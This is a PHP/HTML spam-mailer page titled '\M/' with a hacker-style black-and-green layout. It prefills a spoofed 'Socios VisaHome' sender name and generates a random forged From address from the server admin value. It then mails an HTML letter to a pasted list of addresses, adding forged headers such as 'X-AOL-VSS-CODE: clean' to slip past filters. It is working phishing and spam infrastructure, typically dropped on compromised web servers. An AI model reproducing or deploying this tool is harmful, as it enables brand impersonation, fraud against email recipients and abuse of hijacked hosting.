<html>
<head>
<title>\M/</title>
</head>
<body bgcolor="#e6e6e6">
<center>
<form action="" method="post">
<header><title>-</title></header>
<center>
    <body>
	<script>

	</script>
	
<style>
body {
    background: black;
    color: #00FF00;
    font-family: monospace;
}

.accessGranted {
    position: absolute;
    top: 200px;
    background: #333;
    padding: 20px;
    border: 1px solid #999;
    width: 300px;
    left: 50%;
    margin-left: -150px;
    text-align: center;
}

.accessDenied {
    position: absolute;
    top: 200px;
    color: #F00;
    background: #511;
    padding: 20px;
    border: 1px solid #F00;
    width: 300px;
    left: 50%;
    margin-left: -150px;
    text-align: center;
}
#content-center {
    width: 400px;
    padding: 0px 10px 10px 10px;
    width: 800px; 
    margin: 0 auto;
}
#content-left {
margin: 0 auto;
     text-align: left;
}
#content-right {
margin: 0 auto;
     text-align: right;
}
input,select,textarea{
    border:0;
    border:1px solid #900;
    background:black;
    margin:0;
        color: white;

    padding:2px 4px;
}
input:hover,textarea:hover,select:hover{
    background:black;
        color: blue;

    border:1px solid #f00;
}
                        a{ text-decoration:none; color:red;}

</style>
    <form method="post" action="#" name="form" id="form">
        <table>
            <tr>
                <td>
                    <label for="from"></label>
                    <input type="text" name="from" id="from" placeholder="Originating email"
                    value="<?php echo genRanStr(); echo genRanStr(); echo genRanStr().$_SERVER['SERVER_ADMIN'].'.com' ; ?>" size="35">
                </td>
                <td>
                    <label for="fromName"></label>
                    <input type="text" name="fromName" id="fromName" size="19" value="Socios VisaHome">
                </td>
            </tr>
            <tr>
                <td>
                    <label for="subject"></label>
                    <input name="subject" type="text" id="subject" placeholder="Subject" value="<?php $datetime = date("d/m/Y h:i:s"); echo "Avisos y Mensajes  ";  echo $datetime; ?> " size="35">
                </td>
            </tr>
            <tr>
                <td>
                    <label for="letter"></label>
                    <textarea name="letter" cols="36" rows="20"
                              id="letter"></textarea>
                </td>
                <td>
                    <label for="email"></label>
                    <textarea cols="20" rows="20" name="email" id="email">idb.code87@yahoo.com</textarea>
                </td>
            </tr>
            <tr>
                <td colspan="2"><br>
				<br>
                   <center> 
				   <input name="taz" class="myButton" type="submit" value="&#x02605; Spam Now &#x02605; " name="submit" id="submit">
				   <style>
				   </style>
                </td>
            </tr>
        </table>
    </form>
</center>
</body><font color="#000000"/>
&copy;	--
</html>
<center>
<?php

session_start();

function genRanStr($length = 8)
{
    $charset = "AZERTYUIOPQSDFGHJKLMWXCVBNazertyuiopqsdfghjklmwxcvbn123456789ACNBCXGTYDTYDXTVXSRTDXGHBHVNHB09898675.";
    $charactersLength = strlen($charset);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $charset[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function normalize($input)
{
    $message = urlencode($input);
    $message = ereg_replace("%5C%22", "%22", $message);
    return urldecode($message);
}

if (isset($_POST['from'])) {
    $from = $_POST["from"];
    $fromName = $_POST["fromName"];
    $subject = $_POST["subject"];
    $email = $_POST["email"];
    if (!isset($_SESSION['letter'])) {
        $_SESSION['letter'] = $_POST["letter"];
    }
    $letter = $_POST["letter"];
    $headers = "From: $fromName <$from>\r\nReply-To: $fromName\r\n";
    $headers .= "MIME-Version: 1.0\n";
    $headers .= "Content-type: text/html; charset=iso-8859-1\n";
	$headers .= "X-AOL-VSS-CODE: clean\n";
    $headers .= "X-Attach-Flag: N\n";
	$count = 1;
    $email = normalize($email);
    $mails = explode("\n", $email);
    echo "<textarea cols='36' rows='20' id='letter' font color=green>";
	foreach ($mails as $mail) {
    if (mail($mail, $subject, $letter, $headers))
      echo "$mail\n";
  else
	  echo "$mail";
    }
echo "</textarea>";
}

?>
